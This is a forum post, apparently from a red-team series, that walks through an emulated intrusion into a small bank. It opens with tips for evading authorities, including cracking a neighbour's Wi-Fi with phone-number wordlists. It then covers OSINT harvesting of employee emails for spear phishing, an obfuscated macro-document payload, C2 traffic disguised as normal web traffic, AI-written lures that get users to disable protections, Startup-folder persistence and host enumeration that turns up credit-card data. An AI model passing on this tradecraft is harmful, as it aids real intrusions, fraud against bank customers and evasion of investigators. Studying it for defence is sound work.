<li>Use a VPN</li>
</ol>
<p>Make it complicated to find you, do some research on your [1] VPN provider. Do they save logs?, Is there a DNS Leak somewhere, are they known for previous breaches, do they allow anonymous payments?. Anything good to stay away from bars.</p>
<ol start="2">
<li>Hello Neighbor</li>
</ol>
<p>Use someone else’s Wi-Fi, you have no idea how simple passwords are used from AT&amp;T, Xfinity and Spectrum to mention a few, the technicians need to apply a password then and there, and sometimes for convenience the users phone number is used, a good tip on how to build a wordlist starting with the area code then work from there Wifite, Reaver, AirCrack [2].</p>
<ol start="3">
<li>In the Matrix</li>
</ol>
<p>Virtualize everything! Workstations, Linux Boxes, your Internet persona and your IRL are 2 completely different people do not mix them! Encrypt the Drives, there are multiple options [3] VeraCrypt, [4] TrueCrypt, [5] CryptSetup</p>
<p>[1] <a href="https://www.vpncenter.com/best-vpn-providers/" class="inline-onebox" rel="noopener nofollow ugc">Best VPN Providers 2023</a></p>
<p>[2] <a href="https://ankit0183.github.io/Wifi-Hacking/" class="inline-onebox" rel="noopener nofollow ugc">Wifi-Hacking | Cyber Security Tool For Hacking Wireless Connections Using Built-In Kali Tools. Supports All Securities (WEP, WPS, WPA, WPA2/TKIP/IES)</a></p>
<p>[3] <a href="https://www.veracrypt.fr/en/Home.html" class="inline-onebox" rel="noopener nofollow ugc">VeraCrypt - Free Open source disk encryption with strong security for the Paranoid</a></p>
<p>[4] <a href="https://truecrypt.sourceforge.net/" rel="noopener nofollow ugc">https://truecrypt.sourceforge.net/</a></p>
<p>[5] <a href="https://gitlab.com/cryptsetup/cryptsetup" class="inline-onebox" rel="noopener nofollow ugc">cryptsetup / cryptsetup · GitLab</a></p>
<p><strong>Recon</strong></p>
<p>Now I will use some OSINT techniques to know a little bit more about my target. These techniques will all be passive to demonstrate how valuable the Internet is and if you take your time to dig a little deeper you should find at least some interesting information that will help in Initial Access.</p>
<p><strong>OSINT</strong></p>
<p>One of the tips given by Phineas is that plenty of information is already available for us when trying to look for anything that can get us into the internal network of the bank, sometimes just visiting the page we can see plenty of information already.</p>
<p>Site:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/d/7dc3a27a9e964a9434f714422254429dd4fa4c98.png" data-download-href="/uploads/short-url/hWyPpnpjenfLA6ShldbyNneACk8.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/d/7dc3a27a9e964a9434f714422254429dd4fa4c98_2_690x324.png" alt="" data-base62-sha1="hWyPpnpjenfLA6ShldbyNneACk8" width="690" height="324" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/d/7dc3a27a9e964a9434f714422254429dd4fa4c98_2_690x324.png, https://0x00sec.s3.amazonaws.com/original/3X/7/d/7dc3a27a9e964a9434f714422254429dd4fa4c98.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/d/7dc3a27a9e964a9434f714422254429dd4fa4c98.png 2x" data-dominant-color="874A5E"></a></div><p></p>
<p>Previously mentioned, the initial access vector utilized in the manifesto was a zero-day vulnerability discovered in the SonicWall VPN. However, as we do not possess a zero-day exploit, we are resorting to the tried-and-true method of phishing. As the saying goes, there are no better words than those of the man who teaches OPSEC to those who wish to conceal as much as possible from authorities and cherish their privacy.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/3/a38be0bb8bf3c0c7db673c7fef4fcd32a4701570.png" data-download-href="/uploads/short-url/nkNvUcjpcod0x5oC06LnbwbWxIA.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/3/a38be0bb8bf3c0c7db673c7fef4fcd32a4701570.png" alt="" data-base62-sha1="nkNvUcjpcod0x5oC06LnbwbWxIA" width="690" height="172" role="presentation" data-dominant-color="0E0E0E"></a></div><p></p>
<p>To continue enumerating the site, we need names, emails, phone numbers, social media. Anything that can help us in sending our payload to the users. Remember phishing comes in various forms [1], but the popular one’s are emails.</p>
<p>I like to run various tools that enumerate in a similar way to achieve the same goal, sometimes we miss something because other tools do the same enumeration but in a different from that they pull more or less information, in this step I’m just going to use a web crawler ZAP [2] which has been great to me in my assessments, and of course it’s open source. A second option that also is quite fast is Photon [4]</p>
<p>ZAP:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/6/960bd85cdaf07507c647cc2a87b615393b3afe85.png" data-download-href="/uploads/short-url/lpmZV50RhQZZrjdfGdeuVQi5M4l.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/6/960bd85cdaf07507c647cc2a87b615393b3afe85_2_690x154.png" alt="" data-base62-sha1="lpmZV50RhQZZrjdfGdeuVQi5M4l" width="690" height="154" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/6/960bd85cdaf07507c647cc2a87b615393b3afe85_2_690x154.png, https://0x00sec.s3.amazonaws.com/original/3X/9/6/960bd85cdaf07507c647cc2a87b615393b3afe85.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/6/960bd85cdaf07507c647cc2a87b615393b3afe85.png 2x" data-dominant-color="F0F2F3"></a></div><p></p>
<p>It’s good to look at the site manually as well, and just browse the site as a regular user, but remember you are trying to hide your tracks and you are trying to give as little as information possible about yourself. So a good thing I like to use is a User Agent Spoofer, the user agent acts like a digital footprint where it tells the site, which browser, operating system, etc. has visited the website.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/8/c888f82d196d3e6a3803b2e5ab3389549f1c883b.png" data-download-href="/uploads/short-url/sC0WSRQpKQG24tkhQxU0cvjteUb.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/8/c888f82d196d3e6a3803b2e5ab3389549f1c883b_2_690x16.png" alt="" data-base62-sha1="sC0WSRQpKQG24tkhQxU0cvjteUb" width="690" height="16" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/8/c888f82d196d3e6a3803b2e5ab3389549f1c883b_2_690x16.png, https://0x00sec.s3.amazonaws.com/original/3X/c/8/c888f82d196d3e6a3803b2e5ab3389549f1c883b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/8/c888f82d196d3e6a3803b2e5ab3389549f1c883b.png 2x" data-dominant-color="1A1A1A"></a></div><p></p>
<p>You can see in my logs the User Agent is being spoofed correctly and is hiding our real OS and other little pieces of information that the User Agent is giving.</p>
<p>When looking for usernames/emails we have to be thorough, gather as much information as possible.</p>
<p>Since we are targeting (Spear Phishing) we want to be as detailed as possible with our pretext and we don’t want to be another spammer, we want to be careful with our email servers as well it’s important to test[3] and send slow and clean emails, depending on the format utilized by the corporation we are targeting a good tip is to send emails to recruiters, public figures of the sort and maybe HR when looking for a job, sales and marketing are a great option and you can see the email format being utilized.</p>
<p>You can see in the example below the template used for an email format:</p>
<p>(I’m hiding it, because you know)</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/6/66e704a236d00d0b10238ba690ca4b189b41c3fd.png" data-download-href="/uploads/short-url/eGjEFB3EPWG7Zncdm2IQs7rD1ut.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/6/66e704a236d00d0b10238ba690ca4b189b41c3fd.png" alt="" data-base62-sha1="eGjEFB3EPWG7Zncdm2IQs7rD1ut" width="690" height="214" role="presentation" data-dominant-color="F6F7F8"></a></div><p></p>
<p>A nice trick for finding emails is to visit the Contact Page some websites contain a support page or a form where we can reach out to the company and the email is publicly available.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/2/02c93383ce407276b61d6879d19d7c232d096bc9.png" data-download-href="/uploads/short-url/oE1EcEPVOidKq6pDLUFU6e22xP.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/2/02c93383ce407276b61d6879d19d7c232d096bc9_2_690x453.png" alt="" data-base62-sha1="oE1EcEPVOidKq6pDLUFU6e22xP" width="690" height="453" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/2/02c93383ce407276b61d6879d19d7c232d096bc9_2_690x453.png, https://0x00sec.s3.amazonaws.com/original/3X/0/2/02c93383ce407276b61d6879d19d7c232d096bc9.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/2/02c93383ce407276b61d6879d19d7c232d096bc9.png 2x" data-dominant-color="E1CFD7"></a></div><p></p>
<p>The email domain used for the company is shown when we utilize the contact form, checking the About Us sometimes gives out information about the “TEAM”, people that currently work at the location just to make them look a little more friendly and approachable, they give out info such as favorite places to eat, dogs name, hobbies and such, usually this is good info for building passwords.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/6/e69cf64be7c39d2804d47665136427e73c3385f8.png" data-download-href="/uploads/short-url/wU66GVHr0uid32mcYfDFIlKUUcM.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e69cf64be7c39d2804d47665136427e73c3385f8_2_641x500.png" alt="" data-base62-sha1="wU66GVHr0uid32mcYfDFIlKUUcM" width="641" height="500" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e69cf64be7c39d2804d47665136427e73c3385f8_2_641x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/6/e69cf64be7c39d2804d47665136427e73c3385f8_2_961x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/6/e69cf64be7c39d2804d47665136427e73c3385f8.png 2x" data-dominant-color="D6C3C2"></a></div><p></p>
<p>We found some probable users here, it’s a small list but perfect for personalizing our pretext on each user. But we need to find the email format on how the emails are built, these usually come in ways like:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/2/22046723e638a30ae6e0e73551c83ed950e51d05.png" alt="" data-base62-sha1="4QVFmvMf5jZxImjDghR1FmsTk6V" width="675" height="315" role="presentation"></p>
<p>These are some of the email format examples in which we can locate valid emails, once we find the formatting, we can locate other users as well. I’ll build an email list using this with the current users found on the About Us page.</p>
<p>Will continue with sending emails now to our target but we will require a little more information tobuild viable pretext for our phishing.</p>
<p><strong>[1] <a href="https://www.microsoft.com/en-us/security/business/security-101/what-is-phishing?&amp;ef_id=_k_Cj0KCQjwuNemBhCBARIsADp74QQ8T-mQP_ZGqAioBLuKnvTqzA8Y374jld3LWwnmDtp-JpMSIfKciCAaAuuaEALw_wcB_k_&amp;OCID=AIDcmmdamuj0pc_SEM__k_Cj0KCQjwuNemBhCBARIsADp74QQ8T-mQP_ZGqAioBLuKnvTqzA8Y374jld3LWwnmDtp-JpMSIfKciCAaAuuaEALw_wcB_k_&amp;gclid=Cj0KCQjwuNemBhCBARIsADp74QQ8T-mQP_ZGqAioBLuKnvTqzA8Y374jld3LWwnmDtp-JpMSIfKciCAaAuuaEALw_wcB" rel="noopener nofollow ugc">Common Phishing Techniques</a></strong></p>
<p><strong>[2]</strong> <strong><a href="https://github.com/zaproxy/zaproxy" class="inline-onebox" rel="noopener nofollow ugc">GitHub - zaproxy/zaproxy: The ZAP core project</a></strong></p>
<p>[3] <a href="https://www.mail-tester.com/" rel="noopener nofollow ugc">https://www.mail-tester.com/</a></p>
<p>[4] <a href="https://github.com/s0md3v/Photon" class="inline-onebox" rel="noopener nofollow ugc">GitHub - s0md3v/Photon: Incredibly fast crawler designed for OSINT.</a></p>
<p><strong>Initial Access</strong></p>
<p>As mentioned previously there was a Sonic Wall Exploit that was utilized to gain Initial Access[1] but since that’s out of the question will use spear phishing attachemnts a Sub-Technique from Phishing some attachment examples can be Word, Excel, PowerPoint, HTA, VBS and many other file types to send and get execution.</p>
<p>A way to choose your initial payload is looking at job postings for the place you are targeting you can sometimes see what they require and the technologies they are working with:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/3/53fb1b8d1a2fc2d9cc7f81b9005cbd084272dc08.png" data-download-href="/uploads/short-url/bYVCMYU6cQscjpWBOMLW5TBPtXO.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/3/53fb1b8d1a2fc2d9cc7f81b9005cbd084272dc08.png" alt="" data-base62-sha1="bYVCMYU6cQscjpWBOMLW5TBPtXO" width="690" height="219" role="presentation" data-dominant-color="EFEFEF"></a></div><p></p>
<p>This info gives out potential information on how to approach our attachments, is it a Windows or Mac environment are they utilizing Office? LibreOffice? but for now we can use attachments such as Office documents.</p>
<p>Building our payload[2] can be a tedious task since we have to consider EDR, AV and other security products that are on site, but since this is just a playground we know that we can work with office documents with macros enabled, some security features but not as complicated as Phineas called for since it was a small bank in the real scenario that meterpreter payloads can do the job, no shame with that since this can be customized and worked on but just for reference on what I’m talking about.</p>
<p>As my next choice I have to work with a C2 that will get all my agents called back my choice here is Havoc C2 a great tool developed using Go, C and ASM. I’ve been working pretty much with it lately and have been loving it. You are open to choose any other C2 I won’t be explaining Havoc here since I’ve done it already in the past [3]. I added some OPSEC considerations and evasions already built within Havoc and edited the profiles so it looks like regular HTTP/HTTPS traffic.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/f/bf6dccdb757a6050b0d9ade284545e5dc4e2fc63.png" data-download-href="/uploads/short-url/rjsrrVJzvOvbXqY9eRFsf6va96H.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/f/bf6dccdb757a6050b0d9ade284545e5dc4e2fc63_2_690x461.png" alt="" data-base62-sha1="rjsrrVJzvOvbXqY9eRFsf6va96H" width="690" height="461" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/f/bf6dccdb757a6050b0d9ade284545e5dc4e2fc63_2_690x461.png, https://0x00sec.s3.amazonaws.com/original/3X/b/f/bf6dccdb757a6050b0d9ade284545e5dc4e2fc63.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/f/bf6dccdb757a6050b0d9ade284545e5dc4e2fc63.png 2x" data-dominant-color="080A0C"></a></div><p></p>
<p>Now to build the payload I’ll use a private framework I’ve been working on for Initial Access.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/4/549bce5855e583e59cbb3116a3f90c73fdaf2ef6.gif" alt="" data-base62-sha1="c4tV43eXUDEyKDupMDVruE2d9BA" width="690" height="318" role="presentation" class="animated"></p>
<p>The framework builds an obfuscated/encrypted macro-enabled word document. The tool uses multiple options I researched on for Win32 API and some evasion techniques for the word document, just like on the manifesto.</p>
<p>” <em><code>I am not an APT with a team of coders who can make me  customized tools. I am a simple person who subsists on what the terminal  gives</code></em> “.</p>
<p>And of course, I just use what my skills allow me and the great open-source research available to customize or build other techniques from them.</p>
<p>Now our pretext is needed to get the user we are targeting to download and run our word document, for this we don’t need to be that imaginative anymore as Ai [3] can be a powerful but scary thing.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/9/299612ba22059c1bb77b69764515dfe6b1c7dda4.png" data-download-href="/uploads/short-url/5VT6BwizmmvrRLMv3bFUMOT3zco.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/9/299612ba22059c1bb77b69764515dfe6b1c7dda4.png" alt="" data-base62-sha1="5VT6BwizmmvrRLMv3bFUMOT3zco" width="690" height="222" role="presentation" data-dominant-color="4E505E"></a></div><p></p>
<p>We can work with this and customize some instructions to get the user to enable or disable some necessary security implementations so our macro enabled document can run with no problems. Which you can see it’s something shown when MOTW is bypassed if not a different warning would appear not allowing the user to enable the macros but this tells the user that macros are in the word document.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/2/82bf091a9c4143b5fa78e4be97d122b382c396b8.png" data-download-href="/uploads/short-url/iEDmveeyYe58smNkCXIMDtJ6hIc.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/2/82bf091a9c4143b5fa78e4be97d122b382c396b8.png" alt="" data-base62-sha1="iEDmveeyYe58smNkCXIMDtJ6hIc" width="690" height="367" role="presentation" data-dominant-color="32302C"></a></div><p></p>
<p>As you can imagine phishing is a great initial access vector but can be troublesome and get complicated as so much security is applied to protect the company but so much security and restrictions tend to break things. So, companies here and there tend to disable them so the workflow can be less complicated.</p>
<p><code>We sacrifice security for commodity</code></p>
<p>When our infrastructure, the quality of payloads and our evasion has been valuated. Our chances of success are quite high, spear phishing has greater of a chance for success. Remember we want to play it nicely and slowly, OPSEC is important, we don’t want to lose our access, remember were trying to access a Bank, which is no joke as small as it may be the connections for investigations are similar to bigger banks, that’s why you have to consider that as small as the place can be it still has some security implementations, and our area of discovery can get smaller.</p>
<p>Now let’s get our hands dirty.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/3/e3c426d5b788a8ee74aabf5fe202caed80d47188.png" data-download-href="/uploads/short-url/wuUDBO6ZOc1kDk6ZWX0zxhIFnBu.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/3/e3c426d5b788a8ee74aabf5fe202caed80d47188_2_690x206.png" alt="" data-base62-sha1="wuUDBO6ZOc1kDk6ZWX0zxhIFnBu" width="690" height="206" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/3/e3c426d5b788a8ee74aabf5fe202caed80d47188_2_690x206.png, https://0x00sec.s3.amazonaws.com/original/3X/e/3/e3c426d5b788a8ee74aabf5fe202caed80d47188.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/3/e3c426d5b788a8ee74aabf5fe202caed80d47188.png 2x" data-dominant-color="2C2E3A"></a></div><p></p>
<p>[1] <a href="https://www.grayhatacademy.com/resource_redirect/landing_pages/102675" class="inline-onebox" rel="noopener nofollow ugc">Hardware Hacking Workshop Online | Registration</a></p>
<p>[2] <a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-infrastructure/weaponization" class="inline-onebox" rel="noopener nofollow ugc">Weaponization - Red Team Notes 2.0</a> (Shame on me)</p>
<p>[3] <a href="https://chat.openai.com/" rel="noopener nofollow ugc">https://chat.openai.com/</a></p>
<p><strong>Recon &amp; Persistence</strong></p>
<p>We need to start gathering information on the machine and the user we are currently working with some questions to ask are who are we, where are we and what permissions do we have on the user or host, these steps are usually a factor for us to decide on what to do next, will currently focus on Host Enumeration as there is much info that we can retrieve from the workstation itself and that way we may avoid for the time being creating malicious traffic to other workstation an example being the Domain Controller (DC) since when we approach the Active Directory (AD) Enumeration will be talking abouthis one a lot.</p>
<p>Now let’s check our permissions and who are we?</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/a/8a37880ac962800496607457ca71b4dfadb8652f.png" data-download-href="/uploads/short-url/jIIRIyilLLvrQhiQAOpF4gCJNVB.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/8/a/8a37880ac962800496607457ca71b4dfadb8652f_2_689x272.png" alt="" data-base62-sha1="jIIRIyilLLvrQhiQAOpF4gCJNVB" width="689" height="272" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/8/a/8a37880ac962800496607457ca71b4dfadb8652f_2_689x272.png, https://0x00sec.s3.amazonaws.com/original/3X/8/a/8a37880ac962800496607457ca71b4dfadb8652f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/8/a/8a37880ac962800496607457ca71b4dfadb8652f.png 2x" data-dominant-color="32343F"></a></div><p></p>
<p>A warning on our persistence:</p>
<p><code>We must be careful as in real life we don't want to make very  unforgivable mistakes [1], as this would give us time behind bars, let's  get an idea on our persistence we can add some little bit of sazz onto  the technique [2] or probably do some research and find a new method. </code></p>
<p>In our enumeration we need to take in consideration when using C# and custom tools when running these custom tools built in C# we want to move onto another process, sometimes our current process doesn’t hold the capacity to execute correctly or even returns us output from our tool. We must move by injecting:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a9cf27d34acc71b219dcc9558199af765bfed98.png" data-download-href="/uploads/short-url/fd8RVhSIXK4QKneWXZDnUvAC5MQ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a9cf27d34acc71b219dcc9558199af765bfed98_2_690x67.png" alt="" data-base62-sha1="fd8RVhSIXK4QKneWXZDnUvAC5MQ" width="690" height="67" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a9cf27d34acc71b219dcc9558199af765bfed98_2_690x67.png, https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a9cf27d34acc71b219dcc9558199af765bfed98.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a9cf27d34acc71b219dcc9558199af765bfed98.png 2x" data-dominant-color="323642"></a></div><p></p>
<p>Now let’s test the custom tool.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/f/9f3ab5308c8733177cc844eae8825daf535d3fba.png" data-download-href="/uploads/short-url/mIBHjvoXKHLlSQoZMPWCDc7Grge.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/f/9f3ab5308c8733177cc844eae8825daf535d3fba_2_690x153.png" alt="" data-base62-sha1="mIBHjvoXKHLlSQoZMPWCDc7Grge" width="690" height="153" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/f/9f3ab5308c8733177cc844eae8825daf535d3fba_2_690x153.png, https://0x00sec.s3.amazonaws.com/original/3X/9/f/9f3ab5308c8733177cc844eae8825daf535d3fba.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/f/9f3ab5308c8733177cc844eae8825daf535d3fba.png 2x" data-dominant-color="2F313D"></a></div><p></p>
<p>Now that we’ve located the startup folder, we can place a binary here or script and it will run with no issues. This example searches for the StartUp folder location for persistence.</p>
<p>But now we need to look for stuff, what’s on the host? Are we admins, where are we? Who are we? Permissions? Domain Admin?!! Sometimes this information doesn’t come easy, but sometimes it is [3][4]. Automation is key here, but we do want to consider that our behavior is also being monitored by security products looking for malicious or strange actions not usually done on a regular work day.</p>
<p>Some tools for searching interesting files on a host are SaruonEye[]5 and Snaffler[6].</p>
<p>When using SauronEye I recommend avoiding the “–contents” flag it will take a lot for the output to even show on the C2 and some don’t even have enough for all that info.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/5/e560e1839480e09487558deb398a400657a2098f.png" data-download-href="/uploads/short-url/wJaUf1nNBMEMWr91R0yg1N6b0ib.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e560e1839480e09487558deb398a400657a2098f_2_690x175.png" alt="" data-base62-sha1="wJaUf1nNBMEMWr91R0yg1N6b0ib" width="690" height="175" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e560e1839480e09487558deb398a400657a2098f_2_690x175.png, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e560e1839480e09487558deb398a400657a2098f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e560e1839480e09487558deb398a400657a2098f.png 2x" data-dominant-color="2D2E3A"></a></div><p></p>
<p>Since it’s a TXT it’s easy to just read it from the terminal</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/4/f4bec541cae3c19aac0010c486e9d8d271a78140.png" data-download-href="/uploads/short-url/yV7e3J6uZ5tppK7G2sQ64e95ycE.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/4/f4bec541cae3c19aac0010c486e9d8d271a78140_2_690x296.png" alt="" data-base62-sha1="yV7e3J6uZ5tppK7G2sQ64e95ycE" width="690" height="296" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/4/f4bec541cae3c19aac0010c486e9d8d271a78140_2_690x296.png, https://0x00sec.s3.amazonaws.com/original/3X/f/4/f4bec541cae3c19aac0010c486e9d8d271a78140.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/4/f4bec541cae3c19aac0010c486e9d8d271a78140.png 2x" data-dominant-color="2E303C"></a></div><p></p>
<p>Good found some nice CC info but this won’t do the bank holds more info than just that! We need to keep looking but according to SauronEye and Snaffler that’s it .</p>
<p>I guess now is a good time to escalate our privileges, our current user can’t do much and only has access to its current machine but maybe another one can help us move to other places.</p>
<p>For lateral movement I recommend making the recon for this part as targeted as possible. We don’t want queries as this will most likely send an alert.[5] Let’s make sure we only target our current user, should be important to know as much of who we are [6]. Remember PowerShell and C# are going to be your best friends here. Integrated with Windows, native no dependencies, what more can we ask. Also since AD is a pretty big topic it’s good to be prepared [7][8][9][10][11][12][13].</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/7/e719adce9a8fb92ca401393e37548bd0f918fcc5.png" data-download-href="/uploads/short-url/wYpjnnZ6ZnoFk2Xsj72wXmMmLbf.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/7/e719adce9a8fb92ca401393e37548bd0f918fcc5_2_690x199.png" alt="" data-base62-sha1="wYpjnnZ6ZnoFk2Xsj72wXmMmLbf" width="690" height="199" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/7/e719adce9a8fb92ca401393e37548bd0f918fcc5_2_690x199.png, https://0x00sec.s3.amazonaws.com/original/3X/e/7/e719adce9a8fb92ca401393e37548bd0f918fcc5.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/7/e719adce9a8fb92ca401393e37548bd0f918fcc5.png 2x" data-dominant-color="2E303C"></a></div><p></p>
<p>Before going on enumerating the entire domain let’s take a look at where we currently at our current host, great tools for local enumeration and other types have been compiled in the SharpCollection[14] github repo these are C# binaries that are meant to be run as standalone or in-memory (convenient) using a C2 Framework (Cobalt Strike, Covenant, Empire, Havoc). One of the tools of interest from experience is Seatbelt [15] which has been incredibly helpful in my engagements and has automated enumeration for User and Host information.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/a/6ad0e085b59c0c4371aa65939d5ad3d16fec6564.png" data-download-href="/uploads/short-url/feW7Zlw3mBgm5Byp27fUUfZqnoo.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6ad0e085b59c0c4371aa65939d5ad3d16fec6564_2_690x331.png" alt="" data-base62-sha1="feW7Zlw3mBgm5Byp27fUUfZqnoo" width="690" height="331" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6ad0e085b59c0c4371aa65939d5ad3d16fec6564_2_690x331.png, https://0x00sec.s3.amazonaws.com/original/3X/6/a/6ad0e085b59c0c4371aa65939d5ad3d16fec6564.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/a/6ad0e085b59c0c4371aa65939d5ad3d16fec6564.png 2x" data-dominant-color="323540"></a></div><p></p>
<p>If I were to get lucky, I do like to check some common things that give me a ton of information for my next steps a quick check is the OS Info:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/c/5c7779242b19f63a79957c37b6825de96d8587ac.png" alt="" data-base62-sha1="dbZTDNheHHK3YB94QVI2aABfKtm" width="676" height="386" role="presentation"></p>
<p>What security am I going up against depending on my usage PowerShell or C#:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/6/66dcee15a856aa6e5848b5b158be0c50172d71fa.png" alt="" data-base62-sha1="eFY2CR4mmAjYW6Z7iE9ZJ8cNXl0" width="481" height="201" role="presentation"></p>
<p>And Hotfixes look for some quick wins and probably can escalate my privileges using an exploit instead of relying on finding credentials, which is still not bad and need.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/e/de8039475875b77829d9ecba6f16f60d576f954b.png" data-download-href="/uploads/short-url/vKkIqp0AB53jRwXWcKpBEiQStgD.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/e/de8039475875b77829d9ecba6f16f60d576f954b_2_690x243.png" alt="" data-base62-sha1="vKkIqp0AB53jRwXWcKpBEiQStgD" width="690" height="243" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/e/de8039475875b77829d9ecba6f16f60d576f954b_2_690x243.png, https://0x00sec.s3.amazonaws.com/original/3X/d/e/de8039475875b77829d9ecba6f16f60d576f954b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/d/e/de8039475875b77829d9ecba6f16f60d576f954b.png 2x" data-dominant-color="373943"></a></div><p></p>
<p>This does not mean to not look at everything the tool gives you, it’s just some quick looks so take your time and check it out. Since we aren’t admins, we can’t see that much on the Host so seatbelt has flags that we can utilize to categorize the type of enumeration we are looking for on the host or on the user, this next flags show interesting files that were last worked on:</p>
